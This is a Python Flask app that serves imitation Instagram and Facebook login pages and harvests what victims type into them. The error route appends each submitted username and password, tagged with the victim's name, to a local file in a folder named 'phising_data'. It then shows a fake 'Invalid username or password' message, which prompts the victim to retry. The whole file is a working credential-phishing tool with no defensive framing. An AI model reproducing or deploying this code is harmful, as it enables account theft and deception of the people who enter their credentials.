from flask import Flask, render_template, request

app = Flask(__name__)
name=''
@app.route('/')
def HomePage():
    return render_template('index.html')

@app.route('/instagram', methods=['POST'])
def login():
    global name
    name=request.form['fullname']
    if name:
        return render_template('login_with_insta.html')
    else:
        noname= 'Invalid Name!'
        return render_template('index.html', noname=noname )

@app.route('/facebook')
def fblogin():
    return render_template('login_with_fb.html')

@app.route('/error', methods=['POST'])
def error():
    error='Invalid username or password!'
    username=request.form['username']
    password=request.form['password']
    if 'insta' in request.form:
        if username and password: 
            with open("/storage/emulated/0/phising_data/id_passwd.txt","a") as f:
                f.write(f"[Instagram: {name}]\nusername: {username} | password: {password}\n\n")
        return render_template('login_with_insta.html', error=error)
    elif 'fb' in request.form:
        if username and password:
            with open("/storage/emulated/0/phising_data/id_passwd.txt","a") as f:
                f.write(f"[Facebook: {name}]\nusername: {username} | password: {password}\n\n")
        return render_template('login_with_fb.html', error=error)
if __name__ == '__main__':
    app.run(debug=True)